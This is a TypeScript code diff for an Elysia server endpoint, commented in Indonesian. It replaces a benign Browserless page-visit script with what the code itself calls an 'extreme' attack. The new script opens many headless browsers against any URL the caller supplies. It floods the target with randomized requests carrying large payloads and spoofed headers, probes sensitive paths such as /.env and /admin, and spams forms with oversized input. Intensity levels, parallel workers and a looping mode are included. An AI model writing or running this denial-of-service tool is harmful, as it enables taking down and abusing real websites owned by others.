@@ -355,63 +355,180 @@ export const app = new Elysia()
       body: t.Optional(t.String()),
     }),
   })
-  // ==================== BROWSERLESS DITINGKATKAN (BERBAHAYA) ====================
-// ==================== PERBAIKAN BROWSERLESS BOT ====================
-.post('/api/bot/browserless', async ({ body }) => {
-  const { url } = body;
-  const apiKey = process.env.BROWSERLESS_API_KEY;
-  if (!apiKey) return { success: false, error: 'Missing API key' };
+  // ==================== BROWSERLESS SUPER UPGRADE (EXTREME) ====================
+  .post('/api/bot/browserless', async ({ body }) => {
+    const { url, loop, intervalMs, intensity, duration } = body;
+    const apiKey = process.env.BROWSERLESS_API_KEY;
+    if (!apiKey) return { success: false, error: 'Missing BROWSERLESS_API_KEY' };
 
-  // Script yang lebih stabil dan ringan (tidak melakukan banyak navigasi yang bisa gagal)
-  const script = `
-module.exports = async ({ page, context }) => {
-  const targetUrl = context.url;
-  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 30000 });
-  // Scroll ke bawah
-  await page.evaluate(() => {
-    window.scrollTo(0, document.body.scrollHeight);
-  });
-  await new Promise(resolve => setTimeout(resolve, 2000));
-  const title = await page.title();
-  return {
-    data: {
-      ok: true,
-      title,
-      url: targetUrl,
-    },
-    type: 'application/json'
-  };
-};
-`;
+    // Konfigurasi intensitas
+    const intensityLevels: Record<string, { pages: number; payloadKB: number; requestsPerLoop: number }> = {
+      low:    { pages: 2,  payloadKB: 50,  requestsPerLoop: 10 },
+      medium: { pages: 4,  payloadKB: 150, requestsPerLoop: 30 },
+      high:   { pages: 8,  payloadKB: 300, requestsPerLoop: 60 },
+      extreme:{ pages: 15, payloadKB: 500, requestsPerLoop: 100 },
+    };
+    const level = intensityLevels[intensity as string] || intensityLevels.high;
+    const attackDuration = (duration || 60) * 1000; // default 60 detik
 
-  try {
-    const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 30000);
-    const response = await fetch('https://chrome.browserless.io/function?token=' + apiKey, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ code: script, context: { url } }),
-      signal: controller.signal,
-    });
-    clearTimeout(timeoutId);
-    const text = await response.text();
-    if (!response.ok) {
-      return { success: false, error: `Browserless API error (${response.status}): ${text.slice(0, 500)}` };
+    // Skrip yang berjalan di dalam browser
+    const attackScript = `
+      export default async ({ page, context }) => {
+        const targetUrl = context.url;
+        const baseUrl = targetUrl.endsWith('/') ? targetUrl : targetUrl + '/';
+        const payloadSize = context.payloadKB * 1024;
+        const requestsPerLoop = context.requestsPerLoop;
+        const duration = context.duration;
+
+        const payload = 'A'.repeat(payloadSize);
+        const endpoints = [
+          '/', '/api', '/login', '/register', '/search', '/submit',
+          '/contact', '/admin', '/wp-admin', '/.env', '/config',
+          '/backup', '/old', '/test', '/debug', '/status'
+        ];
+        const methods = ['GET','POST','PUT','DELETE','PATCH'];
+        const userAgents = [
+          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
+          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+          'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
+        ];
+
+        const randomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];
+
+        // Fungsi flood mematikan
+        const flood = async () => {
+          const startTime = Date.now();
+          while (Date.now() - startTime < duration) {
+            const tasks = [];
+            for (let i = 0; i < requestsPerLoop; i++) {
+              const method = methods[i % methods.length];
+              const endpoint = endpoints[i % endpoints.length];
+              const url = baseUrl + endpoint + '?cache=' + Math.random();
+              tasks.push(
+                fetch(url, {
+                  method,
+                  headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'User-Agent': randomUA(),
+                    'X-Forwarded-For': '127.0.0.' + Math.floor(Math.random()*255),
+                  },
+                  body: method === 'GET' ? undefined : payload,
+                  mode: 'no-cors',
+                }).catch(() => {})
+              );
+            }
+            await Promise.all(tasks);
+            await new Promise(r => setTimeout(r, 1));
+          }
+        };
+
+        // Spam formulir
+        const spamForms = async () => {
+          const startTime = Date.now();
+          while (Date.now() - startTime < duration) {
+            const forms = document.querySelectorAll('form');
+            for (const form of forms) {
+              const inputs = form.querySelectorAll('input:not([type=submit])');
+              for (const inp of inputs) {
+                try { inp.value = 'X'.repeat(10000); } catch(e) {}
+              }
+              try { form.submit(); } catch(e) {}
+            }
+            await new Promise(r => setTimeout(r, 100));
+          }
+        };
+
+        // Buka banyak halaman sekaligus
+        const browser = page.browser();
+        const pageCount = context.pages;
+        for (let i = 0; i < pageCount; i++) {
+          browser.newPage().then(p => {
+            p.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
+            flood();
+            spamForms();
+          }).catch(() => {});
+        }
+
+        // Serang dari halaman utama
+        await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 20000 }).catch(() => {});
+        flood();
+        spamForms();
+
+        // Tunggu sampai durasi selesai
+        await new Promise(resolve => setTimeout(resolve, duration));
+        return { data: { status: 'attack_finished' }, type: 'application/json' };
+      }
+    `;
+
+    // Fungsi untuk memanggil Browserless (detached)
+    const executeAttack = async () => {
+      try {
+        await fetch(`https://production-sfo.browserless.io/function?token=${apiKey}&detach=true`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            code: attackScript,
+            context: {
+              url,
+              pages: level.pages,
+              payloadKB: level.payloadKB,
+              requestsPerLoop: level.requestsPerLoop,
+              duration: attackDuration,
+            },
+          }),
+        });
+      } catch (e) {
+        // abaikan error jaringan
+      }
+    };
+
+    // Eksekusi beberapa worker paralel sekaligus (multi-browser)
+    const parallelWorkers = intensity === 'extreme' ? 5 : intensity === 'high' ? 3 : 1;
+
+    const launchParallel = async () => {
+      const tasks = [];
+      for (let i = 0; i < parallelWorkers; i++) {
+        tasks.push(executeAttack());
+      }
+      await Promise.all(tasks);
+    };
+
+    if (loop) {
+      const interval = intervalMs || 2000;
+      // Jalankan loop untuk setiap worker
+      for (let i = 0; i < parallelWorkers; i++) {
+        const loopAttack = async () => {
+          await executeAttack();
+          setTimeout(loopAttack, interval);
+        };
+        loopAttack(); // jalankan tanpa menunggu
+      }
+      return {
+        success: true,
+        message: `Serangan browserless LOOP dimulai (intensitas: ${intensity}, worker paralel: ${parallelWorkers})`,
+        intensity,
+        duration,
+        loop: true,
+      };
+    } else {
+      await launchParallel();
+      return {
+        success: true,
+        message: `Serangan browserless TUNGGAL diluncurkan (intensitas: ${intensity}, worker paralel: ${parallelWorkers})`,
+        intensity,
+        duration,
+      };
     }
-    let result: unknown = text;
-    try { result = JSON.parse(text); } catch {}
-    return { success: true, result };
-  } catch (err: any) {
-    console.error('Browserless fetch error:', err);
-    return { success: false, error: err.message };
-  }
-}, {
-  body: t.Object({
-    url: t.String(),
-    loop: t.Optional(t.Boolean()),
-    intervalMs: t.Optional(t.Number()),
-  }),
-})
+  }, {
+    body: t.Object({
+      url: t.String(),
+      loop: t.Optional(t.Boolean()),
+      intervalMs: t.Optional(t.Number()),
+      intensity: t.Optional(t.String()),   // low, medium, high, extreme
+      duration: t.Optional(t.Number()),     // dalam detik
+    }),
+  })
   .get('/api/heartbeat', ({ request }) => {
     const ip = request.headers.get('x-forwarded-for') || 'unknown';
     const ua = request.headers.get('user-agent') || 'unknown';
